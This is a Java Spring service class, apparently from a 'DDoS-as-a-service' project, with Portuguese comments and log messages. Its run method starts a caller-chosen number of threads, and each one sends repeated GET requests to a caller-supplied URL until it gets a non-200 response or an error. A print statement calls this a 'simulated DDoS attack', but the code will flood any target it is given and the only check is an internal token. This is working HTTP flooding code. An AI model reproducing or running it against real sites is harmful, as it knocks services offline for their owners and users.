package com.ddosaas.attacker.service;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import com.ddosaas.attacker.api.dto.RunAttackerDTO;

import lombok.extern.slf4j.Slf4j;

@Service
@Slf4j
public class AttackerService {

    @Value("${internalToken}")
    private String INTERNAL_TOKEN;

    public void run(RunAttackerDTO runDTO) {

        this.checkInternalToken(runDTO);

        ExecutorService executor = Executors.newFixedThreadPool(runDTO.getNumberOfThreads().intValue());
        List<Future<?>> futures = new ArrayList<>();

        System.out.println("Starting simulated DDoS attack with " + runDTO.getNumberOfThreads() + " threads...");

        Runnable task = () -> {
            while (true) {
                try {
                    HttpURLConnection connection = (HttpURLConnection) new URL(runDTO.getUrl()).openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(1000);
                    connection.setReadTimeout(1000);
                    int responseCode = connection.getResponseCode();
                    log.info("{} - Resposta: {}", Thread.currentThread().getName(), responseCode);
                    // connection.disconnect();

                    // Interrompe a thread se não for 200
                    if (responseCode != 200) {
                        break;
                    }

                } catch (Exception e) {
                    log.info("{} - Erro: {}", Thread.currentThread().getName(), e.getMessage());
                    break; // Encerra thread em caso de erro
                }
            }
        };

        // Envia todas as tarefas
        for (int i = 0; i < runDTO.getNumberOfThreads(); i++) {
            futures.add(executor.submit(task));
        }

        // Aguarda todas as tarefas finalizarem
        for (Future<?> future : futures) {
            try {
                future.get(); // Espera o término
            } catch (Exception e) {
                // Trata possíveis interrupções ou exceções
            }
        }

        executor.shutdown();

        log.info("Ataque finalizado. Todas as threads encerraram.");
    }

    private void checkInternalToken(RunAttackerDTO runDTO) {
        if(!INTERNAL_TOKEN.equals(runDTO.getInternalToken())){
            throw new RuntimeException("Token interno de comunicação inválido: " + runDTO.getInternalToken());
        }
    }

}
